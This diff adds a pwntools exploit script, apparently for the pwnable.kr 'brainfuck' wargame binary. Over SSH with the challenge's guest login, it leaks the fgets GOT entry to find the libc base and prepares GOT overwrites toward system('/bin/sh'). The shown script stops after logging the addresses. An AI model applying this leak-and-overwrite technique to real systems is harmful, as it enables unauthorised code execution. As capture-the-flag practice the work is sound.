@@ -1,0 +1,82 @@
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context(os='linux', arch='i386')
+
+# Connect via SSH
+session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
+p = session.process('./brainfuck')
+
+# Load binaries
+e = ELF(r"C:\Users\dalal\Desktop\Private_Projects\CTF\pwnable.kr\brainfuck\brainfuck")  # local copy of the binary
+libc = ELF(r'c:\Users\dalal\Desktop\Private_Projects\CTF\pwnable.kr\brainfuck\libc-2.23.so')  # local copy of the libc
+
+# Addresses
+main_addr = e.symbols['main']
+fgets_got = e.got['fgets']
+memset_got = e.got['memset']
+putchar_got = e.got['putchar']
+fgets_offset = libc.symbols['fgets']
+gets_offset = libc.symbols['gets']
+system_offset = libc.symbols['system']
+
+var_tape = 0x804a0a0
+binsh = b"/bin/sh\0"
+
+# Step 1: Leak fgets
+bf_code = ""
+
+# Move tape pointer to fgets@got
+if var_tape > fgets_got:
+    bf_code += "<" * (var_tape - fgets_got)
+else:
+    bf_code += ">" * (fgets_got - var_tape)
+
+# Print 4 bytes of fgets (leak)
+bf_code += ".>" * 4
+bf_code += "<" * 4
+
+# Overwrite fgets -> system
+bf_code += ",>" * 4
+bf_code += "<" * 4
+
+# Move to memset@got
+if fgets_got > memset_got:
+    bf_code += "<" * (fgets_got - memset_got)
+else:
+    bf_code += ">" * (memset_got - fgets_got)
+
+# Overwrite memset -> gets
+bf_code += ",>" * 4
+bf_code += "<" * 4
+
+# Move to putchar@got
+if memset_got > putchar_got:
+    bf_code += "<" * (memset_got - putchar_got)
+else:
+    bf_code += ">" * (putchar_got - memset_got)
+
+# Overwrite putchar -> main
+bf_code += ",>" * 4
+bf_code += "<" * 4
+
+# Jump to main
+bf_code += "."
+
+# Send bf code
+p.sendlineafter(b"except [ ]\n", bf_code.encode())
+
+# Step 2: Receive leaked fgets address
+fgets_leak = p.recvn(4)
+fgets_addr = u32(fgets_leak)
+libc_base = fgets_addr - fgets_offset
+system_addr = libc_base + system_offset
+gets_addr = libc_base + gets_offset
+
+log.info("fgets_addr : " + hex(fgets_addr))
+log.info("libc base  : " + hex(libc_base))
+log.info("system_addr: " + hex(system_addr))
+log.info("gets_addr  : " + hex(gets_addr))
+log.info("main_addr  : " + hex(main_addr))
+```
